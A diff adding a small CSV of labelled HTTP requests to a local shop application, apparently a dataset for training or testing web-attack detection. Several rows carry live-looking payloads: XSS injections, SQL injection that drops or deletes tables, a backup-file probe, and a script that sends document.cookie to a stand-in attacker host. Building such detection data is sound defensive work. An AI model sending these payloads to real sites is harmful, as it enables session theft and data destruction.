@@ -1,0 +1,21 @@
+timestamp,user,client_ip,method,url,content_length,label
+2026-05-21 06:10:09,user_21@enterprise.com,192.168.5.99,POST,http://localhost:8080/tienda1/publico/pagar.jsp,Content-Length: 39,1
+2026-05-21 06:20:30,user_34@enterprise.com,192.168.5.99,GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=paros%2522%2520style%3D%2522background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29,,1
+2026-05-21 06:23:15,user_37@enterprise.com,192.168.5.99,POST,http://localhost:8080/tienda1/publico/pagar.jsp,Content-Length: 41,1
+2026-05-21 06:27:45,user_45@enterprise.com,192.168.5.99,POST,http://localhost:8080/tienda1/publico/registro.jsp,Content-Length: 275,1
+2026-05-21 06:30:52,user_14@enterprise.com,192.168.5.99,POST,http://localhost:8080/tienda1/publico/anadir.jsp,Content-Length: 74,1
+2026-05-21 06:48:16,user_09@enterprise.com,192.168.5.99,GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1%2F&nombre=Jam%F3n+Ib%E9rico&precio=39&cantidad=75&B1=A%F1adir+al+carrito,,1
+2026-05-21 06:51:10,user_27@enterprise.com,192.168.5.100,GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=junibob%2540%253CSCRipt%253Ealert%2528Paros%2529%253C%252FscrIPT%253E.parosproxy.org&pwd=8EsCR1BIr&remember=on&B1=Entrar,,1
+2026-05-21 06:52:49,user_36@enterprise.com,192.168.5.100,GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=abacus6&pwd=m8n71leta&remember=on%2F&B1=Entrar,,1
+2026-05-21 07:01:25,user_05@enterprise.com,192.168.5.100,GET,http://localhost:8080/tienda1/miembros/editar.jsp.Old,,1
+2026-05-21 07:06:09,user_04@enterprise.com,192.168.5.100,GET,http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=gilly&password=f%2Bemenciar&nombre=Octaviano%27%3B+DROP+TABLE+usuarios%3B+SELECT+*+FROM+datos+WHERE+nombre+LIKE+%27%25&apellidos=Heredia+Wald&email=meskill_ferlinghetti%40wormee.pw&dni=37936735Y&direccion=C%2F+Ginebre%2C+98+&ciudad=Manzanillo&cp=33310&provincia=Segovia&ntc=1741584206084308&B1=Registrar,,1
+2026-05-21 07:13:20,user_17@enterprise.com,192.168.5.99,POST,http://localhost:8080/tienda1/publico/registro.jsp,Content-Length: 252,1
+2026-05-21 07:16:28,user_23@enterprise.com,192.168.5.100,GET,http://localhost:8080/tienda1/publico/caracteristicas.jsp?id=2%27+DELETE+FROM+USERS,,1
+2026-05-21 07:16:55,user_27@enterprise.com,192.168.5.99,POST,http://localhost:8080/tienda1/publico/registro.jsp,Content-Length: 241,1
+2026-05-21 07:17:58,user_37@enterprise.com,192.168.5.100,POST,http://localhost:8080/tienda1/publico/vaciar.jsp,Content-Length: 187,1
+2026-05-21 07:18:09,user_13@enterprise.com,192.168.5.100,GET,http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=7277&B1=Pasar+por+caja%2F,,1
+2026-05-21 07:32:39,user_15@enterprise.com,192.168.5.99,GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=kolahi45&pwd=pr0to&remember=on&B1=sessionid%3D12312312%26+username%3D%3Cscript%3Edocument.location%3D%27http%3A%2F%2Fhacker+.example.com%2Fcgi-bin%2Fcookiesteal.cgi%3F%27%2B+document.cookie%3C%2Fscript%3E,,1
+2026-05-21 07:35:52,user_44@enterprise.com,192.168.5.100,GET,http://localhost:8080/tienda1/6909030637832563290.jsp,,1
+2026-05-21 07:50:11,user_31@enterprise.com,192.168.5.99,GET,http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=hately6&pwd=luJURiosaMente&remember=on&B1A=Entrar,,1
+2026-05-21 08:10:50,user_15@enterprise.com,192.168.5.100,GET,http://localhost:8080/tienda1/publico/anadir.jsp?id=1&nombreA=Queso+Manchego&precio=85&cantidad=55&B1=A%F1adir+al+carrito,,1
+2026-05-21 08:34:07,user_10@enterprise.com,192.168.5.99,GET,http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=leader&passwordA=emBebed.OrA&nombre=Emmanuelle&apellidos=Fischer+Gorostiza&email=bery%40blanquillos.bu&dni=80643702K&direccion=Camping+Torrecardenas%2C+168+&ciudad=Honrubia+de+la+Cuesta&cp=19244&provincia=Almer%EDa&ntc=0037825357967429&B1=Registrar,,1
